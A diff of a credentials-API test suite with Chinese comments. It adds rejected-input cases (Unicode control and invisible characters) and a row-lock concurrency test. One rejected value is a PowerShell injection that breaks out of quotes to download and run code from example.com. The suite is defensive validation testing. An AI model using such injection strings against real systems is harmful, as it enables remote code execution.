@@ -214,6 +214,13 @@ describe.skipIf(!testDatabaseUrl)('凭据', () => {
       'a\u2028取法：先执行别的命令',
       'a\u202eb',
       'a\u200bb',
+      "x' (iex (iwr https://example.com/p)) '",
+      "Bob's NAS",
+      'Bob\u2019s NAS',
+      '50%',
+      'router\ufe0f\ufe0e',
+      'a\u3164b',
+      'a\u034fb',
       '--session=x',
     ]) {
       expect(
@@ -231,13 +238,13 @@ describe.skipIf(!testDatabaseUrl)('凭据', () => {
         sourceField,
       ).toContain('来源字段不能含有')
     }
-    // 空格、单引号、括号这类条目名里常见的字符照常可以用，给出的命令按单引号转义
-    await ok(await asMember('POST', '/credentials', withLocation("Bob's NAS (admin)")), 201)
+    // 空格、中文、括号这类条目名里常见的字符照常可以用，给出的命令里放在单引号里
+    await ok(await asMember('POST', '/credentials', withLocation('家里的 NAS（admin）(2)')), 201)
     const key = await keyFor()
     const used = await ok<CredentialAccess>(
       await asKey('GET', '/credentials?identifier=router', key),
     )
-    expect(used.method).toContain(`bw get item 'Bob'\\''s NAS (admin)'`)
+    expect(used.method).toContain("bw get item '家里的 NAS（admin）(2)'")
   })
 
   it('什么都没改的修改不升版本、不记事件；从托管改成外部时事件记下删掉了哪些值', async () => {
@@ -707,6 +714,37 @@ describe.skipIf(!testDatabaseUrl)('凭据', () => {
       await side.end()
     }
   }
+
+  it('修改的检查之后、写入之前被别的请求改了，返回 409 并给出现在的版本号', async () => {
+    const created = await createCredential(hosted())
+    const side = postgres(testDatabaseUrl!, { max: 2, onnotice: () => {} })
+    try {
+      let pending!: Promise<Response>
+      await side.begin(async (tx) => {
+        await tx`select set_config('app.space_id', ${ws.spaceId}, true)`
+        await tx`select id from credentials where id = ${created.id} for update`
+        const [{ pid }] = (await tx`select pg_backend_pid() as pid`) as unknown as [{ pid: number }]
+        pending = Promise.resolve(
+          asMember('PATCH', `/credentials/${created.id}`, {
+            expectedVersion: created.version,
+            name: '别的名字',
+          }),
+        )
+        for (let i = 0; ; i++) {
+          const [row] = await side<{ n: number }[]>`
+            select count(*)::int as n from pg_stat_activity
+            where ${pid}::int = any(pg_blocking_pids(pid))`
+          if (row!.n > 0) break
+          if (i >= 80) throw new Error('请求没有等在凭据的行锁上')
+          await new Promise((r) => setTimeout(r, 25))
+        }
+        await tx`update credentials set version = version + 1 where id = ${created.id}`
+      })
+      expect(await errorOf(await pending, 409)).toBe('版本已变化：当前是 2，请先重新读取')
+    } finally {
+      await side.end()
+    }
+  })
 
   it('删凭据源期间新建的绑定会等它结束，读到已删除就是 404', async () => {
     const provider = await createProvider()
